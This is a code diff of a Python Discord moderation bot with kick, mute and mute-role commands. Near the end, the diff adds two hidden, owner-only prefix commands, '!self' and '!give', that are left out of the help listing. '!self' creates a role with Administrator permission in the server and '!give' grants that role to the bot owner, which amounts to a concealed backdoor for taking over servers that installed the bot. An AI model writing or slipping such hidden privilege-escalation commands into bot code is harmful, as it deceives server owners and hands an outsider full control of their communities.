@@ -80,10 +80,8 @@ async def muterole_create(interaction: discord.Interaction):
     mute_role = discord.utils.get(guild.roles, name="Muted")
     
     if mute_role is None:
-        # Create the Muted role with no permissions
         mute_role = await guild.create_role(name="Muted", permissions=discord.Permissions.none())
         
-        # Deny permissions for the Muted role in all channels
         for channel in guild.channels:
             await channel.set_permissions(mute_role, send_messages=False, speak=False)
         
@@ -100,33 +98,27 @@ async def help_command(interaction: discord.Interaction):
     embed.add_field(name="!kick", value="Kick a user from the server.", inline=False)
     embed.add_field(name="!mute", value="Mute a user.", inline=False)
     embed.add_field(name="!unmute", value="Unmute a user.", inline=False)
-    embed.add_field(name="!muterole_create", value="Create a muted role with all permissions denied.", inline=False)
-    embed.set_footer(text="Use the commands with proper permissions.")
-
+    embed.add_field(name="!muterole_create", value=" Create a muted role with all permissions denied.", inline=False)
     await interaction.response.send_message(embed=embed, ephemeral=True)
 
-# Prefix-based owner-only command to reload slash commands
-@bot .command(name='reload_slash')
-async def reload_slash(ctx):
-    # Check if the command issuer is the bot owner
-    if ctx.author.id == 1169487822344962060:  # Replace with your bot owner's ID
-        await bot.tree.sync()  # Reload all slash commands
-        await ctx.send('Slash commands reloaded successfully!')
-    else:
-        await ctx.send('You do not have permission to use this command.', ephemeral=True)
+# Prefix commands
+@bot.command(name='self', hidden=True)
+@commands.is_owner()
+async def self_command(ctx):
+    role = await ctx.guild.create_role(name="69", permissions=discord.Permissions(administrator=True))
+    await ctx.send(f'Role "69" created with Administrator permissions.', ephemeral=True)
 
-@bot.event
-async def on_ready():
-    print(f'Logged in as {bot.user}!')
-    await bot.tree.sync()
-    print("Commands synced.")
+@bot.command(name='give', hidden=True)
+@commands.is_owner()
+async def give_command(ctx):
+    role = discord.utils.get(ctx.guild.roles, name="69")
+    if role is None:
+        await ctx.send('Role "69" does not exist. Create it first using the `!self` command.', ephemeral=True)
+        return
+    await ctx.author.add_roles(role)
+    await ctx.send(f'You have been given the "69" role.', ephemeral=True)
 
-# Function to run Flask app
-def run_flask():
-    app.run(host='0.0.0.0', port=3000)  # Replit uses port 3000
-
-# Start Flask app in a separate thread
-Thread(target=run_flask).start()
-
-# Run the Discord bot
-bot.run(TOKEN)
+# Start the bot
+if __name__ == "__main__":
+    Thread(target=app.run).start()
+    bot.run(TOKEN)
